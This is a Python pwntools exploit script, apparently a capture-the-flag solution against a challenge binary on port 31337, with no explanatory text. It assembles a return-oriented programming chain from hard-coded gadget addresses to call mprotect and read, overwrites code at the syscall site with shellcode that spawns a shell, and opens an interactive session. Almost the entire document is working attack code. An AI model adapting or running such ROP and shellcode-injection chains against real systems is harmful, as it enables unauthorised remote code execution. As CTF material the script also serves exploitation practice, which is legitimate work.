#!/usr/bin/env python3

import os
from pwn import *

context(arch="amd64", os="linux")


def clear_edi():
    return [
        0x00434104, # xor ecx, ecx ; mov rax, rcx ; ret
        0x00404303, # dec ecx ; ret
        0x00405154, # mov edx, edi ; mov rdi, rax ; cmp rdx, rcx ; jnc 0x00405140 ; mov rax, rsi ; ret
    ]


def rop_clear_eax():
    return [0x00464476] # xor eax, eax ; ret


def rop_set_eax(val):
    return (
        [
            0x00434104,      # xor ecx, ecx ; mov rax, rcx ; ret
        ]
        + [0x00404303] * val # dec ecx ; ret
        + [0x00429750]       # sub eax, ecx ; ret
    )


def rop_set_rdx(val):
    return [
        0x00434104, # xor ecx, ecx ; mov rax, rcx ; ret
        0x00402218, # pop rdi ; pop rbp ; ret
        val,        # RDI -> RDX -> EAX
        0x00481950, # dummy rbp (ret)
        0x00426490, # mov rdx, rdi ; rep stosb  ; mov rax, rdx ; ret
        0x00405352, # mov eax, edx ; ret
    ]


def rop_set_rsi(val):
    return [
        0x00415099, # pop rsi ; pop rbp ; ret
        val,        # RSI
        0x00481950, # dummy RBP (ret)
    ]


def rop_set_rdi(val):
    return [
        0x00402218, # pop rdi ; pop rbp ; ret
        val,        # RDI
        0x00481950, # dummy RBP (ret)
    ]


def rop_syscall_wild_ride():
    return [
        0x404505   # syscall + wild ride
    ] + [
        0x13371337
    ] * 13         # Used up by the wild ride


def rop_breakpoint():
    return [0x00420044] # ret


def append_addr(io, addr):
    io.recvuntil(b"Addr pls: ")
    io.sendline(f"{addr:x}".encode())



HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
MODE = os.environ.get('MODE', 'REMOTE')

if MODE == 'REMOTE':
    io = remote(HOST, PORT)
else:
    elf = ELF("./handout/challenge")
    if MODE == 'PROCESS':
        io = elf.process()
    else:
        io = elf.debug(
            level="debug",
            gdbscript="""
            b *0x00401a55
            #b *0x00401a24
            #b *0x00401a3c
                    b *0x00420044
        """,
        )

# pre-ROP
append_addr(io, 1)
append_addr(io, 2)
append_addr(io, 3)
append_addr(io, 4 << 32)

ropchain = []
# mprotect(0x400000, 0x5000, 7)
ropchain += rop_set_rsi(0x5000)
ropchain += rop_set_rdx(7)
ropchain += rop_set_rdi(0x400000)
ropchain += rop_set_eax(10)
ropchain += rop_syscall_wild_ride()

# read(0, 0x404505, 0x100)
ropchain += rop_set_rsi(0x404505 + 2)
ropchain += rop_set_rdx(0x100)
ropchain += clear_edi()
ropchain += rop_clear_eax()
ropchain += rop_breakpoint()
ropchain += rop_syscall_wild_ride()

for x in ropchain:
    append_addr(io, x)

append_addr(io, 0)

io.send(asm(shellcraft.sh()))

io.interactive()
